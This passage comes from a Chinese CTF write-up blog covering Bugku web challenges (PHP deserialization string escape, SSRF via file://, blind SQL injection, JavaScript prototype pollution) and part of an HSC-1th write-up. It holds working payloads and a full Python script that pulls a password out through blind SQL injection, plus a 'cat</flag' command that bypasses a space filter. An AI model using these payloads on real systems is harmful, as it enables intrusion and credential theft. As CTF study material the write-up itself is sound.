class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">evil</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"variable\">$hint</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$hint</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;hint = <span class=\"variable\">$hint</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;hint===<span class=\"string\">&quot;hint.php&quot;</span>)</span><br><span class=\"line\">      @<span class=\"keyword\">$this</span>-&gt;hint = base64_encode(file_get_contents(<span class=\"keyword\">$this</span>-&gt;hint)); </span><br><span class=\"line\">    var_dump(<span class=\"keyword\">$this</span>-&gt;hint);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;hint != <span class=\"string\">&quot;╭(●｀∀´●)╯&quot;</span>) &#123; </span><br><span class=\"line\">      <span class=\"comment\">//There&#x27;s a hint in ./hint.php</span></span><br><span class=\"line\">      <span class=\"keyword\">$this</span>-&gt;hint = <span class=\"string\">&quot;╰(●’◡’●)╮&quot;</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>, <span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\"><span class=\"variable\">$data</span></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">global</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">  <span class=\"variable\">$data</span> = str_replace(chr(<span class=\"number\">0</span>).<span class=\"string\">&#x27;*&#x27;</span>.chr(<span class=\"number\">0</span>), <span class=\"string\">&#x27;\\0\\0\\0&#x27;</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">  <span class=\"variable\">$tmp</span> = <span class=\"variable\">$data</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">read</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">global</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">  <span class=\"variable\">$data</span> = <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">  <span class=\"variable\">$r</span> = str_replace(<span class=\"string\">&#x27;\\0\\0\\0&#x27;</span>, chr(<span class=\"number\">0</span>).<span class=\"string\">&#x27;*&#x27;</span>.chr(<span class=\"number\">0</span>), <span class=\"variable\">$data</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"variable\">$r</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$tmp</span> = <span class=\"string\">&quot;test&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = serialize(<span class=\"keyword\">new</span> User(<span class=\"variable\">$username</span>, <span class=\"variable\">$password</span>));</span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/flag/is&#x27;</span>,<span class=\"variable\">$a</span>))</span><br><span class=\"line\">  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;NoNoNo!&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">unserialize(read(write(<span class=\"variable\">$a</span>)));</span><br></pre></td></tr></table></figure>\n\n<p>这里就有一个漏洞了，php反序列化字符串逃逸</p>\n<p>php特性：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 &#125; 作为结尾(字符串除外)，并且是根据长度判断内容的</span><br><span class=\"line\">2.对类中不存在的属性也会进行反序列化</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞原因：序列化的字符串在经过过滤函数不正确的处理而导致对象注入-当字符串长度不够时，反序列化会出错，所以通过字符串逃逸使反序列化成功\"><a href=\"#漏洞原因：序列化的字符串在经过过滤函数不正确的处理而导致对象注入-当字符串长度不够时，反序列化会出错，所以通过字符串逃逸使反序列化成功\" class=\"headerlink\" title=\"漏洞原因：序列化的字符串在经过过滤函数不正确的处理而导致对象注入(当字符串长度不够时，反序列化会出错，所以通过字符串逃逸使反序列化成功)\"></a>漏洞原因：序列化的字符串在经过过滤函数不正确的处理而导致对象注入(当字符串长度不够时，反序列化会出错，所以通过字符串逃逸使反序列化成功)</h5><p>并且如果对于a:2:{i:0;s:6:”tr1ple”;i:1;s:5:”aaaaa”;}i:1;s:5:”aaaaa”; 这种字符串而言，也能够正常反序列化，说明php在反序列化的时候只要求一个反序列化字符串块合法即可，当然得是第一个字符串块</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">evil</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$hint</span>=<span class=\"string\">&quot;hint.php&quot;</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> evil();</span><br><span class=\"line\">var_dump(serialize(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">string</span>(<span class=\"number\">41</span>) <span class=\"string\">&quot;O:4:&quot;</span>evil<span class=\"string\">&quot;:1:&#123;s:4:&quot;</span>hint<span class=\"string\">&quot;;s:8:&quot;</span>hint.php<span class=\"string\">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>构造User类序列化：</p>\n<p>O:4:”User”:2:{s:8:”username”;s:3:”111”;s:8:”password”;s:41:”O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}”}</p>\n<p>username=\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;password=1”;O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}</p>\n<h5 id=\"其第一步序列化结果为O-4-”User”-2-s-8-”username”-s-48-”-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0”-s-8-”password”-s-44-”1”-O-4-”evil”-2-s-4-”hint”-s-8-”hint-php”\"><a href=\"#其第一步序列化结果为O-4-”User”-2-s-8-”username”-s-48-”-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0”-s-8-”password”-s-44-”1”-O-4-”evil”-2-s-4-”hint”-s-8-”hint-php”\" class=\"headerlink\" title=\"其第一步序列化结果为O:4:”User”:2:{s:8:”username”;s:48:”\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0”;s:8:”password”;s:44:”1”;O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}}\"></a>其第一步序列化结果为O:4:”User”:2:{s:8:”username”;s:48:”\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0”;s:8:”password”;s:44:”1”;O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}}</h5><h5 id=\"经过read函数变为\"><a href=\"#经过read函数变为\" class=\"headerlink\" title=\"经过read函数变为\"></a>经过read函数变为</h5><h5 id=\"s-8-”username”-s-48-”111111111111111111111111”-s-8-”password”-s-44-”1”-O-4-”evil”-2-s-4-”hint”-s-8-”hint-php”\"><a href=\"#s-8-”username”-s-48-”111111111111111111111111”-s-8-”password”-s-44-”1”-O-4-”evil”-2-s-4-”hint”-s-8-”hint-php”\" class=\"headerlink\" title=\"{s:8:”username”;s:48:”111111111111111111111111”;s:8:”password”;s:44:”1”; O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}}\"></a>{s:8:”username”;s:48:”111111111111111111111111”;s:8:”password”;s:44:”1”; O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}}</h5><h5 id=\"s-8-”password”-s-44-”1”-长度是24，去掉24个字符，后面就逃逸了，正常的被反序列化了\"><a href=\"#s-8-”password”-s-44-”1”-长度是24，去掉24个字符，后面就逃逸了，正常的被反序列化了\" class=\"headerlink\" title=\"s:8:”password”;s:44:”1”;长度是24，去掉24个字符，后面就逃逸了，正常的被反序列化了\"></a>s:8:”password”;s:44:”1”;长度是24，去掉24个字符，后面就逃逸了，正常的被反序列化了</h5><p>这样两部分就成功引起序列化了</p>\n<h5 id=\"注意read中将’-0-0-0’六个字符替换为了三个字符，这就给反序列化字符串逃逸提供了机会。\"><a href=\"#注意read中将’-0-0-0’六个字符替换为了三个字符，这就给反序列化字符串逃逸提供了机会。\" class=\"headerlink\" title=\"注意read中将’\\0\\0\\0’六个字符替换为了三个字符，这就给反序列化字符串逃逸提供了机会。\"></a>注意read中将’\\0\\0\\0’六个字符替换为了三个字符，这就给反序列化字符串逃逸提供了机会。</h5><p>成功得到hint.php </p>\n<p>string(68)”PD9waHAKICRoaW50ID0gImluZGV4LmNnaSI7CiAvLyBZb3UgY2FuJ3Qgc2VlIG1lfgo=”</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"> <span class=\"variable\">$hint</span> = <span class=\"string\">&quot;index.cgi&quot;</span>;</span><br><span class=\"line\"> <span class=\"comment\">// You can&#x27;t see me~</span></span><br></pre></td></tr></table></figure>\n\n<p>得到</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;  <span class=\"string\">&quot;args&quot;</span>: &#123;    <span class=\"string\">&quot;name&quot;</span>: <span class=\"string\">&quot;Bob&quot;</span>  &#125;,   </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;headers&quot;</span>: &#123;    <span class=\"string\">&quot;Accept&quot;</span>: <span class=\"string\">&quot;*/*&quot;</span>,     <span class=\"string\">&quot;Host&quot;</span>: <span class=\"string\">&quot;httpbin.org&quot;</span>,     <span class=\"string\">&quot;User-Agent&quot;</span>: <span class=\"string\">&quot;curl/7.64.0&quot;</span>,     <span class=\"string\">&quot;X-Amzn-Trace-Id&quot;</span>: <span class=\"string\">&quot;Root=1-62641f4f-23fc1b7b738f818a52c57615&quot;</span>  &#125;,   </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;origin&quot;</span>: <span class=\"string\">&quot;114.67.175.224&quot;</span>,   <span class=\"string\">&quot;url&quot;</span>: <span class=\"string\">&quot;http://httpbin.org/get?name=Bob&quot;</span> &#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h5 id=\"感觉有ssrf\"><a href=\"#感觉有ssrf\" class=\"headerlink\" title=\"感觉有ssrf\"></a>感觉有ssrf</h5><p>知道ssrf存在然后就可以通过file协议来直接读取flag了</p>\n<p>直接空格 发现出去了，file:///flag直接读取flag文件，得到flag</p>\n<h5 id=\"http是以空格作为截断符的，有了空格，自动判断输入结束\"><a href=\"#http是以空格作为截断符的，有了空格，自动判断输入结束\" class=\"headerlink\" title=\"http是以空格作为截断符的，有了空格，自动判断输入结束\"></a>http是以空格作为截断符的，有了空格，自动判断输入结束</h5><p>最终构造url/index.cgi?name= file:///flag   一定要有空格</p>\n<h4 id=\"都过滤了\"><a href=\"#都过滤了\" class=\"headerlink\" title=\"都过滤了\"></a>都过滤了</h4><p>到这我们整理一下手头的信息，概括性地来看SQL注入攻击的话，注入点、payload、服务器的响应，这时三个重要的要素。这一题的注入点我感觉不会是http首部什么的，应该就是uname和passwd了（因为我的尝试不断有发现）；payload的话有一些过滤我已经发现了，这个待会儿再说；倒是服务器的响应值得我们注意，目前得到的响应有三种，密码错、用户名错、检测到注入，我们挨个来看，密码错很明显就是admin用户是存在的，这就给我们这题提供了个方向，我们很可能就是要去拿到admin的密码，而用户名错显然就是用户不存在了，这里我们需要思考一下，既然服务器区别了用户不存在和密码错误这两种情况，那后端的SQL语句就不可能是一句 select * from user where username=用户名 and password=密码 这样的语句能够完成的了，必然还会有一句select  * from user where username=用户名 来检验用户名的存在与否，我们先来看看select * from user where username=用户名是不是存在注入呢？</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://114.67.175.224:13241/&quot;</span></span><br><span class=\"line\">cookie = &#123;</span><br><span class=\"line\"><span class=\"string\">&#x27;PHPSESSID&#x27;</span>:<span class=\"string\">&#x27;dd0f1d95b41201cc44cc1332ee72e5b4&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">password = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">100</span>):                                      <span class=\"comment\">#select * from user where username=1&amp;passwd=2</span></span><br><span class=\"line\">    payload1 = <span class=\"string\">&quot;admin&#x27;^(length(passwd)=&quot;</span> + <span class=\"built_in\">str</span>(i) + <span class=\"string\">&quot;)^&#x27;&quot;</span>    <span class=\"comment\">#与0异或不变 admin&#x27;^(length(passwd)=i)^&#x27;闭合后面的 </span></span><br><span class=\"line\">    data = &#123;                                                 <span class=\"comment\">#后面的是空的，相当于0，总体是这个意思</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;uname&#x27;</span>: payload1,\t\t\t\t\t\t\t\t\t <span class=\"comment\">#字符串与数字比较会变成0</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;passwd&#x27;</span>: <span class=\"string\">&#x27;123&#x27;</span>\t\t\t\t\t\t\t<span class=\"comment\">#SELECT * FROM userdetail WHERE username=0 是永真的</span></span><br><span class=\"line\">    &#125;\t\t\t\t\t\t\t\t\t\t<span class=\"comment\">#比较成功，返回1，username错误，反之，返回0，username正确</span></span><br><span class=\"line\">    r = requests.post(url=url, cookies=cookie, data=data)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&quot;username error!!@_@&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;密码的长度是&quot;</span>+<span class=\"built_in\">str</span>(i))   </span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">33</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"string\">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class=\"line\">        payload = <span class=\"string\">&quot;admin&#x27;-(ascii(mid((passwd)from(&quot;</span> + <span class=\"built_in\">str</span>(i) + <span class=\"string\">&quot;)))=&quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">ord</span>(j)) + <span class=\"string\">&quot;)-&#x27;&quot;</span> <span class=\"comment\">#字符串相减</span></span><br><span class=\"line\">        data = &#123;         \t<span class=\"comment\">#相等就是1，为-1，失败，查询username，反之查询password</span></span><br><span class=\"line\">            <span class=\"comment\">#ascii()返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;uname&#x27;</span>: payload,  <span class=\"comment\">#这样就理顺了所有的代码</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;passwd&#x27;</span>: <span class=\"string\">&#x27;123&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        r = requests.post(url=url, cookies=cookie, data=data)</span><br><span class=\"line\">        <span class=\"comment\"># print r.content</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;username error!!@_@&quot;</span> <span class=\"keyword\">in</span> r.text:python</span><br><span class=\"line\">            password += j</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;密码是&quot;</span>+password)</span><br></pre></td></tr></table></figure>\n\n<p>拿到可以执行命令的窗口就好弄了，空格被过滤了，那么就直接cat&lt;/flag</p>\n<p>4dcc88f8f1bc05e7c2ad1a60288481a2</p>\n<p><a href=\"https://www.somd5.com/\">MD5免费在线解密破解_MD5在线加密-SOMD5</a> 免费解密网站</p>\n<p>bugkuctf</p>\n<h4 id=\"sodirty\"><a href=\"#sodirty\" class=\"headerlink\" title=\"sodirty\"></a>sodirty</h4><h6 id=\"js原型污染\"><a href=\"#js原型污染\" class=\"headerlink\" title=\"js原型污染\"></a>js原型污染</h6><h5 id=\"1-御剑扫描，扫到www-zip-下载下来。\"><a href=\"#1-御剑扫描，扫到www-zip-下载下来。\" class=\"headerlink\" title=\"1.御剑扫描，扫到www.zip,下载下来。\"></a>1.御剑扫描，扫到<a href=\"http://www.zip,下载下来./\">www.zip,下载下来。</a></h5><p>源代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> setFn = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;set-value&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> router = express.Router();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> Admin = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;password&quot;</span>:process.env.password?process.env.password:<span class=\"string\">&quot;password&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">router.post(<span class=\"string\">&quot;/getflag&quot;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res, next</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (req.body.password === <span class=\"literal\">undefined</span> || req.body.password === req.session.challenger.password)&#123;</span><br><span class=\"line\">        res.send(<span class=\"string\">&quot;登录失败&quot;</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(req.session.challenger.age &gt; <span class=\"number\">79</span>)&#123;</span><br><span class=\"line\">            res.send(<span class=\"string\">&quot;糟老头子坏滴很&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> key = req.body.key.toString();</span><br><span class=\"line\">        <span class=\"keyword\">let</span> password = req.body.password.toString();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(Admin[key] === password)&#123;</span><br><span class=\"line\">            res.send(process.env.flag ? process.env.flag : <span class=\"string\">&quot;flag&#123;test&#125;&quot;</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            res.send(<span class=\"string\">&quot;密码错误，请使用管理员用户名登录.&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">router.get(<span class=\"string\">&#x27;/reg&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res, next</span>) </span>&#123;</span><br><span class=\"line\">    req.session.challenger = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;username&quot;</span>: <span class=\"string\">&quot;user&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;password&quot;</span>: <span class=\"string\">&quot;pass&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;age&quot;</span>: <span class=\"number\">80</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    res.send(<span class=\"string\">&quot;用户创建成功!&quot;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">router.get(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res, next</span>) </span>&#123;</span><br><span class=\"line\">    res.redirect(<span class=\"string\">&#x27;index&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">router.get(<span class=\"string\">&#x27;/index&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res, next</span>) </span>&#123;</span><br><span class=\"line\">    res.send(<span class=\"string\">&#x27;&lt;title&gt;BUGKU-登录&lt;/title&gt;&lt;h1&gt;前端被炒了&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;./reg&quot;&gt;注册&lt;/a&gt;&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">router.post(<span class=\"string\">&quot;/update&quot;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res, next</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(req.session.challenger === <span class=\"literal\">undefined</span>)&#123;</span><br><span class=\"line\">        res.redirect(<span class=\"string\">&#x27;/reg&#x27;</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (req.body.attrkey === <span class=\"literal\">undefined</span> || req.body.attrval === <span class=\"literal\">undefined</span>) &#123;</span><br><span class=\"line\">            res.send(<span class=\"string\">&quot;传参有误&quot;</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> key = req.body.attrkey.toString();</span><br><span class=\"line\">            <span class=\"keyword\">let</span> value = req.body.attrval.toString();</span><br><span class=\"line\">            setFn(req.session.challenger, key, value);</span><br><span class=\"line\">            res.send(<span class=\"string\">&quot;修改成功&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = router;</span><br></pre></td></tr></table></figure>\n\n<p>下面例子可以看到。我们只需要在最开始的原形中增加参数，其后者都会继承</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 构造函数(Person)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Person</span>(<span class=\"params\">name,age</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.name = name</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.age = age</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 实例化(Person)</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> per = <span class=\"keyword\">new</span> Person(<span class=\"string\">&#x27;小王&#x27;</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(per.password)  <span class=\"comment\">//undefined</span></span><br><span class=\"line\"></span><br><span class=\"line\">Person.prototype.password = <span class=\"string\">&quot;adasd&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(per.password)  <span class=\"comment\">//adasd</span></span><br></pre></td></tr></table></figure>\n\n<p>2.所以构造</p>\n<p>attrkey=age&amp;attrval=20 绕过年龄限制</p>\n<p>attrkey=<strong>proto</strong>.pwd&amp;attrval=222 添加新的原型</p>\n<p>password=222&amp;key=pwd 即可得到flag</p>\n<p>所以进行传参，想某一对象的原形增加参数</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">data</span>=&#123;<span class=\"string\">&quot;attrkey&quot;</span>:<span class=\"string\">&quot;__proto__.pwd&quot;</span>,<span class=\"string\">&quot;attrval&quot;</span>:<span class=\"string\">&quot;222&quot;</span>&#125;</span><br><span class=\"line\">update(url,<span class=\"keyword\">data</span>)</span><br><span class=\"line\">#通过这样的方式我们把原形增加了 &#123;pwd:<span class=\"number\">222</span>&#125;</span><br><span class=\"line\">#如果Admin[key]  本身没有pwd参数的话，就回从上找原形。故通过这种方式</span><br><span class=\"line\">Admin[<span class=\"string\">&#x27;pwd&#x27;</span>]=<span class=\"number\">222</span></span><br><span class=\"line\">所以我们在进行传入代码</span><br><span class=\"line\"><span class=\"keyword\">data</span>=&#123;<span class=\"string\">&quot;password&quot;</span>:<span class=\"string\">&quot;222&quot;</span>,<span class=\"string\">&quot;key&quot;</span>:<span class=\"string\">&quot;pwd&quot;</span>&#125;</span><br><span class=\"line\">getflag(url,<span class=\"keyword\">data</span>) 即可获取flag</span><br></pre></td></tr></table></figure>\n\n","categories":["ctf比赛"],"tags":["bugku大多数web题目，剩下的能力提高了"]},{"title":"HSC-1th","url":"/2022/02/25/HSC-1th/","content":"<p>题目难度中等的比赛</p>\n<span id=\"more\"></span>\n\n<h4 id=\"HSC-1th-wp\"><a href=\"#HSC-1th-wp\" class=\"headerlink\" title=\"**HSC-1th **wp\"></a>**HSC-1th **wp</h4><h4 id=\"参赛账号：n9-排名：29\"><a href=\"#参赛账号：n9-排名：29\" class=\"headerlink\" title=\"参赛账号：n9 排名：29\"></a>参赛账号：n9 排名：29</h4><h5 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h5><h6 id=\"CLICK\"><a href=\"#CLICK\" class=\"headerlink\" title=\"CLICK\"></a>CLICK</h6><p>将页面保存拿下来，用flag查找工具可以找到ZmxhZ3tkYzc2MWQ4Ny00OGJjLTRhN2YtODU2My1jMzc1MDQ4N2M5Zjh9Cg==，用base64解码可得flag{dc761d87-48bc-4a7f-8563-c3750487c9f8}</p>\n<h6 id=\"Web-sign-in\"><a href=\"#Web-sign-in\" class=\"headerlink\" title=\"Web-sign in\"></a>Web-sign in</h6><p>1.网址后加/robots.txt可以找到Disallow: fiag_ls_h3re.php</p>\n<p>2.打开发现查看源代码禁用，网址前加view-source:也可以查看源代码，最终找到flag{5a163d35-10a2-46b4-9763-920152029e9f}</p>\n<h5 id=\"Reverse\"><a href=\"#Reverse\" class=\"headerlink\" title=\"Reverse\"></a>Reverse</h5><h6 id=\"hiahia-o-▽-┛\"><a href=\"#hiahia-o-▽-┛\" class=\"headerlink\" title=\"hiahia o(^▽^)┛\"></a>hiahia o(<em>^▽^</em>)┛</h6><p>很简单的直接加密，用ida反编译，根据反编译的代码结果可以得出解题代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">key=<span class=\"string\">&quot;igdb~Mumu@p&amp;&gt;%;%&lt;$&lt;p&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(i&gt;<span class=\"number\">9</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(i&amp;<span class=\"number\">1</span>==<span class=\"number\">0</span>):</span><br><span class=\"line\">            flag=<span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(key[i])-<span class=\"number\">11</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(i%<span class=\"number\">2</span>==<span class=\"number\">1</span>):</span><br><span class=\"line\">            flag = <span class=\"built_in\">chr</span>(<span 